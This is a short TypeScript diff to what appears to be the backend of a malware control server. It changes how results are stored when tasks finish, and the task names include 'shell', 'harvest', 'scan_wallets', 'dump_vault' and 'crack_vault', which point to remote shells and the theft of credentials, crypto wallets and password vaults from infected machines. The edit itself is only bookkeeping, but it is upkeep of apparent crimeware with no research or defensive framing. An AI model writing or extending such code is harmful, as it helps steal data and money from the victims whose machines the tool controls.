@@ -133,9 +133,13 @@ async function closeTaskFromArtifact(artifact: Artifact): Promise<void> {
   const task = await prisma.task.findUnique({ where: { id: artifact.taskId } });
   if (!task || !['queued', 'running'].includes(task.status)) return;
   if (['file_pull', 'shell', 'screenshot', 'harvest', 'scan_wallets', 'dump_vault', 'crack_vault'].includes(task.name)) {
+    const current = task.result as Record<string, unknown> | null;
+    const result = current && typeof current.upload_id === 'string'
+      ? current
+      : { artifactId: artifact.id, http_result: true };
     await prisma.task.update({
       where: { id: task.id },
-      data: { status: 'done', result: { artifactId: artifact.id } as never, finishedAt: new Date(), leaseUntil: null }
+      data: { status: 'done', result: result as never, finishedAt: new Date(), leaseUntil: null }
     });
   }
 }
